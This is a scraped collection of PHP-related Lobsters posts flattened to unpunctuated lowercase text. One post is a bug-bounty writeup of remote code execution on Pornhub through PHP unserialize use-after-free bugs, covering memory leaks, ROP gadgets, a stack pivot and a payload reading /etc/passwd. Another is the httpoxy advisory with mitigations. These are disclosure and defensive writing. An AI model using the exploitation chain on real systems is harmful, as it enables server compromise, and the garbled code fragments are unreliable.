afraid people code following phpfig standard religiously fig stand framework interoperability group phpfig created number framework developer phptek since various member applied voted increasing size group first lot controversy exists regarding phpfig people consider phpfig best thing happened php community since php others considers group something best forgotten one problem phpfig present like faq idea behind group project representative talk commonality project find way work together main audience aware rest php community watching folk want adopt welcome aim nobody group want tell programmer build application however view work several member group clearly see objective quite contrary statement member work tirelessly attempt make phpfig become accepted php standard group also original name group classifying work phpfig modern php book website blogposts forum etc classifying way backwards one problem phpfig even though many framework open source project adopted several standard standard mainly deal problem framework perspective render pretty unusable many reallife industry situation many people develop software industry extremely efficient secure costeffective software customer willing buy use bothered standard conform need framework fanatic tried would disaster business kind standard group need created reflect interest entire php community framework open source cm project developer represented developer php programming language represented much larger membership right vote choose adopt standard developed phpfig understand standard autoloader standard several standard direct effect upon code software many industry demand highly scalable runtime critical costeffective software simply developed using standard phpfig wrong way following phpfig religiously neglecting security trouble programmer never tell programmer late seymour cray defprogrammingcom secure coding practice writing program resistant attack malicious mischievous people program secure coding help protect data theft corruption addition insecure program provide access attacker take control server user identity resulting anything denial service single user compromise secret loss service damage system thousand user every computer program potential target security attack attacker try find security vulnerability application try use vulnerability steal secret corrupt program data gain control server network customer property reputation stake security something added software insecure application may require extensive redesign secure must identify nature threat software incorporate secure coding practice beginning throughout planning development application securing critical software resource important ever focus attacker steadily moved toward application layer sans study found attack web application constitute total attack attempt observed internet php unusual programming language web framework time mean php lot web feature builtin language make easy write insecure code secure default complexity kill suck life developer make product difficult plan build test introduces security challenge cause enduser administrator frustration ray ozzie order application designed implemented proper security requirement secure coding practice focus security risk must integrated daytoday operation thought development process generally much le expensive build secure software correct security issue software package completed mention cost may associated security breach wrong way developing secure software default faq easy misunderstand written document let clarify issue q point site confrontational approach create discussion thought current practice extreme view q saying objectoriented programming bad wrong course saying always thinking always using objectoriented paradigm solving problem bad whenever think black white wrong even within single application different problem exist multiparadigm sometimes best solution depends problem trying solve whenever forcefeed specific problem unfit solution bad thing happen q saying framework bad trying judge specific framework dealing issue always using framework top php q framework get running quickly bad analyzed situation long term implication see getting running quickly problem ever deal bad hardly dealing programming software development dealing mostly pointandclick solution getting running quickly designing software mostly mean analyzed problem facing understood long term implication choice q saying third party package bad promoting use third party library code easily integrate project without enforcing limitation restriction ever great q website idea combating extremism php community personal fame recognition naming people shift focus problem addressed website people addressing problem stay focused idea q experience software development idea thought conclusion expressed website take much experience reach stay focused main theme always particular thing people say recommended reading php wrong way hacker news php wrong way launched spawned bunch comment hacker news many valuable argument worth reading bad scientific code beat code following best practice simpleminded carefree nearincompetence better industrialstrength good intention paving superhighway hell real world outside computer full example program without oop fresh alternative perspective brian discus three video think objectoriented programming bad idea begin finish series couple note nonoop code written coder work reflection craft programming based nearly eighty hour conversation fifteen alltime great programmer computer scientist q interview coder work provide multifaceted view great programmer learn program practice craft think future programming trait proficient programmer competence mean enough experience knowledge get stuff done proficiency involves knowing something certain way fit big picture word proficient practitioner always competent practitioner opposite may true owasp secure coding guideline technology agnostic document defines set general software security coding practice checklist format integrated software development lifecycle implementation practice mitigate common software vulnerability security design principle web application security essential component successful project whether open source php application web service straight processing proprietary business web site hosters rightly shun insecure code user shun insecure service lead fraud aim development guide allow business developer designer solution architect produce secure web application done earliest stage secure application cost develop insecure application far cost effective long run survive deep end php security every target serious security breach quickly note press release website security important take seriously taking sentiment heart learn hard way recommended refactoring improving design existing code refactoring improving design existing code process changing software system way alter external behavior code yet improves internal structure refactoring even take bad design rework good one book offer thorough discussion principle refactoring including spot opportunity refactoring set required test also catalog proven refactorings detail use refactoring step step instruction implementing example illustrating work book written using java principle language idea applicable oo language practice programming compendium practical matter importance working programmer pragmatic programmer pragmatic programmer journeyman master examines core programming process taking requirement producing working maintainable code delight user cover topic ranging personal responsibility career development architectural technique keeping code flexible easy adapt reuse understanding programming language choice programming language one important factor influence ultimate quality software system unfortunately many programmer poor linguistic skill passionately love native language able analyze language constraint understanding programming language written purpose explaining alternative available language designer language construct used term safety readability language construct implemented one efficiently complied role language expressing enforcing abstraction contribute contribute github clone edit submit pull request consideration add section sectionslanguage directory edit existing section
185,Lobsters,php,PHP programming,"How we broke PHP, hacked Pornhub and earned 20.000$",https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/,broke php hacked pornhub earned,tl dr hackerone hackerone credit haxonaut cutz evonide hackerone unserialize phpcodz useafterfree fuzzing unserialize writeup breaking php garbage collection unserialize executable space protection returnoriented programming pie aslr rop php application bs segment elf header php internals book copying zvals never use user input unserialize assuming using uptodate php version enough protect unserialize scenario bad idea avoid use le complex serialization method like json sinthetic lab public hackerone report,started auditing pornhub php ended breaking tl dr gained remote code execution pornhubcom earned bug bounty hackerone found two useafterfree vulnerability php garbage collection algorithm vulnerability remotely exploitable php unserialize function also awarded internet bug bounty committee cf hackerone credit project realized dario weißer haxonaut cutz ruslan habalov evonide many thanks go cutz coauthoring article pornhub bug bounty program relatively high reward hackerone caught attention taken perspective advanced attacker full intent get deep possible system focusing one main goal gaining remote code execution capability thus left stone unturned attacked pornhub built upon php bug discovery analyzing platform quickly detected usage unserialize website multiple path everywhere could upload hot picture affected example http wwwpornhubcomalbumuploadcreate http wwwpornhubcomuploadingphoto case parameter named cookie got unserialized post data afterwards reflected via setcookie header example request post albumuploadcreate tagsxyz titlexyz response header setcookie expires could verified sending specially crafted array contained object tagsxyz titlexyz exception response layout exception stack trace pathtoafilephp unserialize e main might strike harmless information disclosure first sight generally known using user input unserialize bad idea standard exploitation technique require called propertyorientedprogramming pop involve abusing already existing class specifically defined magic method order trigger unwanted malicious code path unfortunately difficult u gather information pornhub used framework php object general multiple class common framework tested without success bug description core unserializer alone relatively complex involves line code php many internal php class unserialize method supporting structure like object array integer string even reference surprise php track record show tendency bug memory corruption vulnerability sadly known vulnerability type newer php version like php php especially unserialize already got lot attention past eg phpcodz hence auditing compared squeezing already tightly squeezed lemon finally much attention many security fix vulnerability potential drained secure fuzzing unserialize find answer dario implemented fuzzer crafted specifically fuzzing serialized string passed unserialize running fuzzer php immediately lead unexpected behavior behavior reproducible tested pornhub server though thus assumed php version however running fuzzer newer version php generated tb log without success eventually putting effort fuzzing stumbled upon unexpected behavior several question answered issue security related exploit locally also remotely complicate situation fuzzer generate nonprintable data blob size kb analyzing unexpected behavior tremendous amount time necessary analyze potential issue could extract concise proof concept working memory corruption bug called useafterfree vulnerability upon investigation discovered root cause could found php garbage collection algorithm component php completely unrelated unserialize however interaction component occurred unserialize finished job consequently well suited remote exploitation analysis gaining deeper understanding problem root cause lot hard work similar useafterfree vulnerability found seemed promising remote exploitation vulnerability link high sophistication found php bug discovery made necessary write separate article read detail dario fuzzing unserialize writeup addition written article breaking php garbage collection unserialize exploitation even promising useafterfree vulnerability considerably difficult exploit particular involved multiple exploitation stage since main goal execute arbitrary code needed somehow compromise cpu instruction pointer referred rip usually involves following obstacle stack heap also include potential userinput well writable segment flagged nonexecutable cf executable space protection even able control instruction pointer need know want execute ie need valid address executable memory segment common call libc function system execute shell command php context often enough execute zendevalstring usually get executed eg write eval echo php script ie allows u execute arbitrary php code without transition involved library first problem overcome using returnoriented programming rop utilize already existing executable memory fragment binary library second problem however requires find correct address zendevalstring usually dynamically linked program get executed loader map process standard load address case somehow already obtained correct php executable eg finding exact package shipped target locally lookup offset function want discovered pornhub using customly compiled version therefore making difficult determine exact php version well getting information memory layout whole php process leaking php binary required pointer exploiting useafterfrees php usually follows rule soon able fill freed memory later get reused internal php variable called zvals generate vector allow reading arbitrary memory well triggering code execution preparing memory disclosure previously mentioned required obtain information pornhub php binary therefore first step abuse useafterfree inject zval represents php string definition zval structure look like following php zendzendh struct zvalstruct zvaluevalue value value zenduint refcountgc zenduchar type active type zenduchar isrefgc whereas zvaluevalue field defined union hence making type juggling type confusion easily possible zendzendh typedef union zvaluevalue long lval long value double dval double value struct char val int len str hashtable ht hash table value zendobjectvalue obj zendast ast zvaluevalue php variable type string zval type consequently treat union structure contains char pointer length field crafting string zval arbitrary starting point arbitrary length creates powerful infoleak get triggered pornhub setcookie reflects injected zval response header finding php image base usually one start leaking binary stated begin unfortunately pornhub server used protection mechanism like pie aslr randomize image base process shared library also become default distribution ship package enable position independent code next challenge finding correct loading address binary first difficulty somehow obtain single valid address could start leaking helpful know detail php internal memory management particular zval freed php overwrite first eight byte address previously freed chunk hence trick obtain first valid address create integer zval free integer zval finally use dangling pointer zval obtain current value since phpcgi implement multiple worker simply get forked master process memory layout never really change different request long keep sending data size also could send request request time leaking different portion memory letting fake zval string begin different address however obtaining heap address freed chunk right enough get clue executable location due lack useful information surroundings chunk get interesting address relatively complicated technique requires multiple free allocation php structure unserialization process cf rop php application slide due nature bug keep complexity low possible used trick using serialized string like part overall unserialize payload could force unserialize create many empty array free terminated initializing array php consecutively allocates memory zval hashtable one default hashtable entry empty array uninitializedbucket symbol overall able obtain memory fragment looked similar following address leaked previous gdb xxg uninitializedbucket address php uninitializedbucket symbol address directly point php bs segment see occurs multiple time neighborhood lastly freed chunk stated many empty array freed thus abusing circumstance hashtable entry remained unchanged heap able leak specific symbol finally could apply pagewise backwards scan starting uninitializedbucket symbol address find elf header start page leak start page return start page leaking interesting php binary segment point situation complicated thing able leak kb data per request due enforced header size limitation pornhub web server php binary take mb size assuming one request per second leaking would taken hour minute complete afraid exploitation process could get interrupted time essential act fast stealthy possible required implement heuristic guessfilter likely interesting section advance nevertheless could resolve structure referenced elf string symbol table technique like allow omitting whole leaking process entirely applicable since require crafting data structure require knowledge different memory location get address zendevalstring first find elf program header offset scan forward find program header entry type ptdynamic get elf dynamic section section finally contains reference string symbol table type completely dump using size field grab function whose virtual address desire alternatively also use hashtable dthash find function quickly scenario matter much since quickly traverse table locally anyway addition zendevalstring interested symbol location post variable supposed used rop stack later leaking address post data get address supplied post data leak pointer reading phpstreamtempdata sapiglobalsrequestinforequestbodyabstract innerstream readbuf traversing chain look complicated need dereference pointer correct offset quickly find stdin stream point post data inside heap preparing rop payload second part deal actually taking control php process gaining code execution happen need discus one modify instruction pointer first taking instruction pointer adjusted payload contain fake object instead previously used string zval pointer specially crafted zendobjecthandlers table table essence array function pointer whose structure definition found zendzendobjecthandlersh struct zendobjecthandlers zendobjectaddreft addref creating faked zendobjecthandlers table simply setup addref however prefer function behind pointer usually handle incrementation object reference counter created fake object get passed parameter setcookie following thing happen zvalcopyctor parseargobjecttostring zendparseparameters sslssbb zifsetcookie main according ssl one see setcookie expecting string first second parameter mark start optional parameter hence try cast object passed second parameter string finally zvalcopyctor execute zendzendvariablesc zendapi void zvalcopyctorfunc zval zvalue zendfilelinedc case isobject tsrmlsfetch zobjhtp zvalue addref zvalue tsrmlscc particular make call provided addref function address object parameter cf php internals book copying zvals see explanation corresponding assembly look like mov rdi rax callq rax rdi first argument zvalcopyctorfunc function also address fake object zval zvalue source code previously seen definition zvaluevalue typedef object contains element called obj type zendobjectvalue defined follows zendzendtypesh typedef struct zendobjectvalue zendobjecthandle handle const zendobjecthandlers handler zendobjectvalue thus rdi point second entry zendobjectvalue corresponds address first zendobjecthandlers entry mentioned entry custom addref function explains direct control rax bypass previously discussed nonexecutable memory problem obtain information particular needed collect useful gadget prepare stack pivoting rop chain since enough control stack yet leaking rop gadget could setup addref pointer rax respectively take instruction pointer although give starting point ensure provided rop gadget executed cpu pop next instruction address current stack returning first gadget control stack consequently necessary pivot stack rop chain next step copy rax rsp continue ropping using locally compiled version php scanned good candidate stack pivoting gadget found phpstreambucketsplit contained following piece code push rax sub al rcrb rbx pop rsp pop pop retq used nicely modify rsp point post data provided rop chain effectively chaining provided gadget call according calling convention first two parameter function rdi rsi find pop rdi pop rsi gadget pretty common thus easily found however still idea gadget actually existed pornhub version php therefore manually verify presence verifying presence required rop gadget infoleak vector allowed u quickly dump disassembly phpstreambucketsplit check stack pivoting gadget available remote version fortunately little correction gadget offset necessary finally implemented check confirm address correct pivot leak phpbase poprdi leak phpbase poprsi leak phpbase die pivot gadget doesnt seem right unless pivot eq die poprdi gadget doesnt seem right unless poprdi eq die poprsi gadget doesnt seem right unless poprsi eq crafting rop stack final rop payload effectively executed zendevalstring code exit looked like following snippet rop rop pack q phpbase pivot rsp rop pack q junk rop pack q phpbase pop rdi rop pack q postaddr length rop pointing phpcode rop pack q phpbase pop rsi rop pack q retvalptr rop pack q zendevalstring zendevalstring rop pack q phpbase pop rdi rop pack q exit code rop pack q exit exit rop phpcode stack pivot contained pop pop padding inside remaining chain necessary continue setting rdi first parameter zendevalstring rdi required reference code executed code located right rop chain also required keep sending exact amount data request calculated offset stayed correct achieved setting different padding wherever necessary next step finally trigger code execution returning back php interpreter actually technique like quite applicable well create problem easier dealt staying php context returning php able execute arbitrary php code important step able view output equally important unless one want deal side channel receive response remaining tricky part somehow display result pornhub website clean termination php usually phpcgi forward generated content back web server displayed website wrecking control flow badly creates abnormal termination php result never reach http server get around problem simply told php use direct unbuffered response usually used http streaming phpcode eval header xaccelbuffering header contentencoding none header connection close errorreporting echo filegetcontents etcpasswd obendflush obflush flush finally allowed u directly fetch every output php payload generated without worry cleanup routine usually involved cgi process sends data web server increased stealthiness factor minimizing number potential error crash summarize payload contained fake object addref function pointer pointing first rop gadget following diagram visualizes concept final version crafted zval object together rop stack provided post data payload following thing created fake object later passed parameter setcookie caused call provided addref function ie allowed u gain program counter control rop chain prepared registersparameters discussed next able execute arbitrary php code making call zendevalstring finally caused clean process termination also fetching output response body running code got nice view pornhub etcpasswd file due nature attack would also able execute command actually break php run arbitrary syscalls however using php convenient point finally dumped detail underlying system immediately wrote submitted report pornhub hackerone timeline timeline disclosure process hacked pornhub submitted issue hackerone hour later pornhub quickly fixed issue removing call unserialize received reward submitted issue bugsphpnet bug got fixed php security repository received hackerone ibb reward vulnerability pornhub resolved issue hackerone conclusion gained remote code execution would able following thing dump complete database pornhubcom including sensitive user information track observe user behavior platform leak complete available source code site hosted server escalate network root system course none thing done careful attention paid respect scope limitation bug bounty program able find two zero day vulnerability php garbage collection algorithm vulnerability although different php context could reliably remotely exploited unserialize context wellknown using user input unserialize bad idea particular year passed since first weakness become apparent unfortunately even today many developer seem believe unserialize dangerous old php version combined unsafe class sincerely hope destroyed misbelief please finally put nail unserialize coffin following mantra becomes obsolete never use user input unserialize assuming using uptodate php version enough protect unserialize scenario bad idea avoid use le complex serialization method like json newest php version contain fix hence update php php version accordingly many thanks pornhub team polite competent response actually caring security pretending like many company nowadays generous regarding bounty according sinthetic lab public hackerone report last update grateful see submission seems head shellshock vulnerability submission one highest paid public bounty hackerone far many thanks go php developer quickly deploying fix internet bug bounty committee awarding u finally want highlight necessity program see offering high bug bounty motivate security researcher find bug underlying software positively impact site unrelated service well please forget checkout two writeups regarding php bug discovery
186,Lobsters,php,PHP programming,FieldTop - find table columns that might overflow soon,http://blog.garage-coding.com/2016/07/21/check-fields-might-overflow.html,fieldtop find table column might overflow soon,gnoosiccom length,gnoosiccom running year user first tell gnoosic artist like user presented artist might like pick one like one nt time go gnoosic learns user like store preference database among information gnoosic also store popularity different band information stored integer data type popularity field entry pink floyd reached billion maximum allowed int data type billion precisely discussion identifying motivation behind project collaboration emerged aim develop tool would check situation like avoided running tool uncovered column different table gnoosic database required attention since tool built support decision schema mysql database opensourced mit license addition main usecase dual usecase tool show maximum value stored column long way reaching maximum data type allows text data type length column finetuned efficient use disk space
187,Lobsters,php,PHP programming,"HTTP_PROXY security vulnerability in Go, PHP, Python CGI environments",https://httpoxy.org/,httpproxy security vulnerability go php python cgi environment,cgi application vulnerability happen web application vulnerable easy mitigation old news still problem disclosed affected php python python advisory go immediate mitigation registry message header standard use header nginxfastcgi nginx blog post apache apache software official advisory modheaders modsecurity guidance haproxy documentation varnish openbsd relayd lighttpd development microsoft ii php cgi framework microsoft article note note hiawatha hiawatha blog litespeed web server litespeed blog web server github pull request cgi software application contact httpoxyorg httpoxyorg repo ineffective fix php prevention summary trust cgi php network configuration prevention http work minimal example code php python go httpoxy github organization happened history httpoxy contact httpoxyorg httpoxyorg repo cf thanks coverage extra medium account contact httpoxyorg httpoxyorg repo reference,cgi application vulnerability php go python others httpoxy set vulnerability affect application code running cgi cgilike environment come simple namespace conflict rfc cgi put http proxy header request environment variable httpproxy httpproxy popular environment variable used configure outgoing proxy lead remotely exploitable vulnerability running php cgi block proxy header httpoxy vulnerability serverside web application deploying code need worry happen web application vulnerable vulnerable http client make outgoing http connection running serverside cgi application attacker may able proxy outgoing http request made web application direct server open outgoing connection address port choosing tie server resource forcing vulnerable software use malicious proxy httpoxy extremely easy exploit basic form expect security researcher able scan quickly luckily read find affected easy mitigation available old news still problem httpoxy disclosed reading first time probably relax take time reading quaint historical bug hopefully longer affect application maintain verify satisfaction content point reflects original disclosure leaving site mostly unchanged noting fix version guess saying time urgency last year affected thing necessary vulnerable code running cgilike context httpproxy becomes real emulated environment variable http client trust httpproxy configures proxy client used within request handler making http opposed http request example confirmed case found far language environment http client php phpfpm modphp guzzle artax python wsgirefhandlerscgihandler twistedwebtwcgicgiscript request go nethttpcgi nethttp obviously may language considered yet cgi common standard httpproxy seems becoming popular time take sample commonly affected scenario php whether vulnerable depends specific application code php library problem seems fairly widespread using one vulnerable library processing request exploitable using vulnerable library vulnerability affect version php even affect alternative php runtimes hhvm deployed fastcgi present guzzle artax probably many many library guzzle version range vulnerable guzzle another example update streamcontextbuilder utility class example using drupal module us guzzle make outgoing http request example check weather api vulnerable request plugin make python python code must deployed cgi vulnerable usually mean vulnerable code use cgi handler like wsgirefhandlerscgihandler considered normal way deploying python webapps people using wsgi fastcgi affected vulnerable python application probably much rarer vulnerable php application wsgi example vulnerable osenviron polluted cgi data vulnerable version request library trust use osenviron httpproxy without checking cgi use update fixed see python advisory go go code must deployed cgi vulnerable usually mean vulnerable code us nethttpcgi package python considered usual way deploying go web application vulnerability relatively rare nethttpfcgi package comparison set actual environment variable vulnerable vulnerable version nethttp trust use httpproxy outgoing request without checking cgi use update fixed go stable version immediate mitigation best immediate mitigation block proxy request header early possible hit application easy safe safe proxy header undefined ietf listed registry message header mean standard use header even provisional usecase standardscompliant http client server never read send header either strip header completely block request attempting use try mitigation early far upstream http request first enter system way fix lot vulnerable software everything behind reverse proxy application firewall strip proxy header safe block proxy header depends specific setup earliest convenient place block header might web application firewall device directly webserver running apache nginx common mitigation nginxfastcgi use block header passed phpfpm phppm etc fastcgiparam httpproxy fastcgi configuration php vulnerable many language use nginx fastcgi specific nginx coverage recommend read official nginx blog post vulnerability blog post provides graphic depiction httpoxy work extensive mitigation information nginx apache specific apache coverage detail apache software project like tomcat strongly recommend read apache software official advisory matter basic mitigation information find covered much greater depth using apache http server modcgi language like go python may vulnerable httpproxy env var modphp affected due nature php using modheaders unset proxy header processing directive requestheader unset proxy early example using htaccess file ifmodule modheadersc requestheader unset proxy ifmodule using modsecurity use secrule deny traffic proxy header example vary action taste make sure secruleengine id assigned issue secrule requestheaders proxy gt log deny msg httpoxy denied finally using apache traffic server affected use strip proxy header helpful service sitting behind see guidance one possible configuration within pluginconfig inside configuration directory eg usrlocaletctrafficserver etctrafficserver add following directive headerrewriteso stripproxyconf add following new file named stripproxyconf directory cond readrequesthdrhook rmheader proxy haproxy strip header request httprequest delheader proxy version haproxy old ie earlier may httprequest delheader directive must also take care header stripped request served first one http keepalive connection ie take special note limitation described first paragraph documentation varnish varnish following unset header add preexisting vclrecv section sub vclrecv unset reqhttpproxy openbsd relayd relayd following remove header add preexisting filter http protocol httpfilter match request header remove proxy lighttpd reject request containing proxy header create pathtodenyproxylua readonly lighttpd content lightyrequest proxy nil return else return end modify lighttpdconf load modmagnet run lua code servermodules modmagnet magnetattractrawurlto pathtodenyproxylua development strip proxy header request add following lighttpdconf reqheaderremove proxy microsoft ii php cgi framework detailed information mitigating httpoxy ii head official microsoft article cover mitigation greater detail also important know httpoxy affect microsoft web framework eg aspnet active server page installed php third party framework top ii recommend applying mitigation step protect httpoxy attack either block request containing proxy header clear header header safe block browser generally send block request contain proxy header preferred solution run following command line appcmd set config section requestfiltering requestlimitsheaderlimits headerproxy sizelimit note appcmdexe typically path found systemroot directory clear value header use following url rewrite rule systemwebserver rewrite rule rule name erase httpproxy patternsyntax wildcard match url servervariables set name httpproxy value servervariables action type none rule rule rewrite systemwebserver note url rewrite downloadable addin ii included default ii installation hiawatha block request containing proxy header ban sending client via urltoolkit urltoolkit toolkitid blockhttpoxy header proxy denyaccess see information hiawatha blog litespeed web server upgrade mitigate manually one command get upgrade notification soon usrlocallswsadminmisclsupsh v usrlocallswsadminmisclsupsh v see information litespeed blog web server upgrade add configuration information found github pull request cgi software application please let u know place httpoxy found happy help communicate fix platform server library affected contact contact httpoxyorg let u know create pr issue httpoxyorg repo github ineffective fix php userland php fix work bother using unset server httpproxy affect value returned getenv effective mitigation using putenv httpproxy work either precise work value coming actual environment variable rather header used mitigation prevention summary avoid deploy environment cgi data merged actual environment variable use expect cgihttpproxy set proxy cgi internal request necessary trust httpproxy cgi put plainly way trust value http env var cgi environment distinguished request header according specification usage httpproxy cgi context suspicious need configure proxy cgi application via environment variable use variable name never conflict request header one begin http strongly recommend go cgihttpproxy seen ruby mitigation issue php clionly code may safely trust server httpproxy getenv httpproxy bear mind code written cli context often end running sapi eventually particularly utility library code open source code might even going rely httpproxy guard code check phpsapi constant network configuration prevention defenseindepth strategy combat httpoxy entire class security problem severely restrict outgoing request web application make absolute minimum example web application firewalled way make outgoing http request attacker able receive request web application prevented connecting attacker http course another defenseindepth strategy work use http internal request securing connection outside world http request affected httpproxy work using php example illustrative php method called getenv common vulnerability many php library application introduced confusing getenv method return environment variable fact getenv closer server superglobal contains environment variable usercontrolled data specifically php running cgilike server http request header data supplied client merged server superglobal key beginning http information getenv read user sends request proxy header header appears php application getenv httpproxy common php library trusting value even run cgisapi environment reading trusting server httpproxy exactly vulnerability tends happen much le often perhaps name perhaps semantics server superglobal better understood among community minimal example code note example require deployment vulnerable environment actually vulnerability eg phpfpm scriptalias php client new guzzlehttpclient client get http apiinternal secretfoo python wsgirefhandlers import cgihandler def application environ startresponse requestsget http apiinternal secretfoo cgihandler run application go cgiserve httphandlerfunc func w httpresponsewriter r httprequest re httpget http apiinternal secretfoo complete poc repos using docker testing actual listener proxied request prepared httpoxy github organization happened cgi spec header provided mixed environment variable formally known way spec work failure bug goal code vulnerability find correct proxy use autoconfiguring client internal http request made shortly task ruby could completed findproxy method uri generic note httpproxy httpproxy treated specially cgi environment httpproxy may set proxy header httpproxy used httpproxy used variable case insensitive cgihttpproxy used instead instance vulnerability present language example using nethttpcgi module deploying cgi application indicates vulnerability standard danger cgi environment history httpoxy bug first discovered year ago timeline go something like march issue discovered libwwwperl fixed reported randal l schwartz april issue discovered curl fixed albeit probably window reported cris bailiff july implementing httpproxy net http ruby team notice avoid potential issue nice work akira tanaka november issue mentioned nginx mailing list user humbly point issue missing something jonathan matthew exactly right february issue mentioned apache httpddev mailing list spotted stefan fritsch july scott geary engineer vend found instance bug wild vend security team found vulnerability still exploitable php present many modern language library started disclose security response team bug lying dormant year like latent infection pox imagine many people may found issue year never investigated scope language library found historical discussion interest missed let u know contact contact httpoxyorg create issue httpoxyorg repo cf httpoxy number cf assigned cover case language cgi implementation make proxy header available way application tell whether real environment variable application trust value httpproxy environment variable default cgi environment application able tell came request assigned cf far php go apache http server apache tomcat spiffycgihandlers chicken httpclient modfcgi nginx cgi script erlang inets yaw hhvm fastcgi python cgihandler python twisted lighttpd suspect may cf coming httpoxy le common software checked want get cve assigned httpoxy issue couple option thanks coverage linking official announcement affected team become available past two week vend security team worked disclose issue responsibly many affected party could like thank member red hat product security team provided extremely useful advice access experience disclosing widespread vulnerability sitting big complicated disclosure great resource reach help language implementation team kept disclosure norm provided lively discussion extra page metadiscussion whole named disclosure thing contact detail content page licensed tl dr use like permissionattribution necessary put together opinionated note httpoxy medium account regard dominic scheirlinck httpoxy disclosure team july email contact httpoxyorg correction suggestion feel free open issue httpoxyorg repo page updated utc reference
189,Lobsters,php,PHP programming,"According to software metrics, programmers don't seem to evolve",https://www.mullie.eu/how-programmers-evolve/,according software metric programmer nt seem evolve,software metric tool nothing progress improved cauditor different characteristic programmer personality question,recently worked software metric tool taught lot architecture work calculated difference metric mine previous commits plotted result looked personal progress nothing chart show commits affected maintainability index indicates complexity project worked last couple year span thousand commits dozen project last year commits without impact code eg documentation typo fix ignored spike merged multiple existing small project together commit progress expected chart reveal time commits would improve nope average commit still introduces amount complexity commits year ago overall pretty happy saw introduce much complexity even get rid quite regularly progress maintainability index metric revealed pattern improved decided check programmer worked awhile seen grow much surprise nothing progress chart flat curious progress head cauditor let know look like maybe metric useless individual percommit level different characteristic even though metric colleague time really change noticeable difference one knowledgeable built lot application architecture code usually robust follows best practice commits impacted project maintainability index another friend force nature crank much code many feature little time impact really change throughout project wildly different signature programmer personality idea mean lack progress suggests really change grow career maybe able take challenging task get better keeping complexity control difference multiple people notable however second one obviously introduced lot complexity whereas first one even reduces lot time time corresponds experience working first colleague introduce much complexity diligent refactoring troubling piece code second guy lot faster cut occasional corner causing technical debt far conclusion based limited set data ex coworkers industry leader would love learn correlation software metric programmer personality help answering question
190,Lobsters,php,PHP programming,PHP Sucks,https://evertpot.com/PHP-Sucks/,php suck,background php reputation quick search rprogramming php mysql stackoverflow interesting discussion actually matter much worse better php suck stackoverflow survey next open source library open source application,think php suck obvious reason today got mild discussion twitter sparked following tweet nice sentiment worth analyzing bit little bit context background php developer originally started php early point main exposure programming pascal started learning c somebody told take look php immediately sold easy get dynamic mysqlbacked website world code wrote back day awful might expect kept going writing php nearly half life pretty good used main technology perhaps project never leaving computer others turned successful business million user one resulted exit active php community blogger ex member phpfig php version python pep spoken conference author widely deployed opensource library php one thing consider expert think know almost every obscure detail language know echo b foo valid php reputation whenever discussion start involves php twitter hackernews reddit real life usually quickly devolves barrage criticism unqualified quick search reddit php rprogramming show almost universally negative context justified yes php sloppy standard library yes lot bad php code language kind cobbled together thing bit inconsistent stream suck suck every http request whole new instance php application search php mysql stackoverflow see many people showing sample code sql injection interesting discussion low quality php question stackoverflow recently big part issue barrier entry php damn low almost everyone start hacking wordpress template many people php first programming language try without formal education actually matter much big reason lot php developer get defensive come type criticism personally really affected spend time glueing api together odd inconsistency standard library either memorized issue use really good autocompletion tool rarely touch best practice centered around taking advantage php way php code mostly secure automated testing everywhere lot innovation happening code closer java wordpress ecosystem library framework use much greater influence daytoday decision underlying language tell web built php facebook us sucessfully even gone far making new faster php implementation might tell paying bill php successful php love commmunity love new wave php fueled composer thing would correct getting job done kind person live idea worse better php great fit would recommend many new people new business idea start prototyping php simple pretty easy cheap find developer php suck even thing true put php next language like ruby win beauty competition put next java lot weirder lot le correct look language think fine say php worse java ruby python many others pitting merit php language almost popular language likely lose php generally approved enterprise regardless hard zend try convince otherwise noticed pattern people running drupal surprised built php critic right php developer discussion slightest bit nuance get conclusion problem php nothing language reputation count time started conversation programmer upon finding primarily php got awkward sometimes people straightforward respond oh sorry recently talked ceo carefully said ah pretty old school right developer moreso live javadominant corporate bubble likely silently dismiss incompetent programmer hate make feel defensive php mind much worse practically tired defending php tired set back proof competence virtue php programmer taken seriously paid le stackoverflow survey put php developer least paid hilariously position shared lamp wordpress also php also among dreaded next moving new language easy thing learn language bit harder learn in out ecosystem hardest far get point confidence determine library x better library build new reputation new community frustrating best time plant tree year ago second best time today php continue excited maintain open source library somebody asks future use programming answer might mostly golang anyone considering programming career trying get stay away php lot fun interesting language also get job done quick better reputation actual effect future career option since getting lot traction want address common feedback single language programmer past simply set course made php dominant big part open source application took became pretty successful would say stuff done last year related product grateful reason recommend anyone get started feature php lacking social stigma want maximize chance great career pick something else say succesful php stigma negative pressure someone called hackernews effect interested paying bill job might affect much greater ambition want maximize chance getting live occasional stigma liability thanks great feedback though got lot private message people telling feel regret using clickbaity title blog post long time coming first draft written year ago nice get chest
191,Lobsters,php,PHP programming,Phalcon - High Performance PHP Framework,https://phalconphp.com/,phalcon high performance php framework,phalcon provides lowest overhead mvcbased application,low overhead low memory consumption cpu compared traditional framework mvc hmvc module component model view controller dependency injection dependency injection location service container rest case use either micro full stack application meet goal addition powerful set http helper autoloader provides autoloading mechanism php class following router phalconmvcrouter provides advanced routing capability low overhead php cextension phalcon zephirc extension loaded together php one time web server daemon start process class function provided extension ready use application code compiled nt interpreted already compiled specific platform processor thanks lowlevel architecture optimization phalcon provides lowest overhead mvcbased application mvc build single multimodule application ease pleasure using file structure scheme pattern already know single app controller model view public cs img j multiple apps frontend controller model view modulephp backend controller model view modulephp public dependency injection phalcon built upon powerful yet easy understand use pattern called dependency injection initialize define service use virtually anywhere throughout application create dependency injector container di new phalcondi register class function component di set request new phalconhttprequest use anywhere else code request di getshared request restful service writing rest server application never easier boilerplate simple service fit one file use phalconmvcmicro app new micro returning data json app get checkstatus function return response setjsoncontent status important app handle autoloader register namespaces prefix directory class take advantage autoloader event maintain full control file loaded use phalconloader creates autoloader loader new loader register namespaces loader registernamespaces examplebase vendorexamplebase exampleadapter vendorexampleadapter example vendorexample register autoloader loader register router routing supposed nothing nothing le create router router new phalconmvcrouter define route router add adminusersmyprofile controller user action profile orm object relational mapping phql powerful secure phalcon query language phql transaction transaction phalcon allows keep data integrity safe cache improve performance many backend cache phalcon provides orm powerful orm provided phalcon allowing manipulate database record class object mysql postgresql sqlite supported box use invoice use phalconmvcmodel class customer extends model public cstid public cstname public function initialize hasmany cstid invoice class invcstid phql phql highlevel objectoriented sql dialect allows write query using standardized sqllike language phql implemented parser written c translates syntax target rdbms achieve highest performance possible phalcon provides parser us technology sqlite technology provides small inmemory parser low memory footprint also threadsafe phql select formulacars order formulacarsname query manager createquery phql phql select formulacarsname formulacars order formulacarsname query manager createquery phql phql select cname formulacars c order cname query manager createquery phql 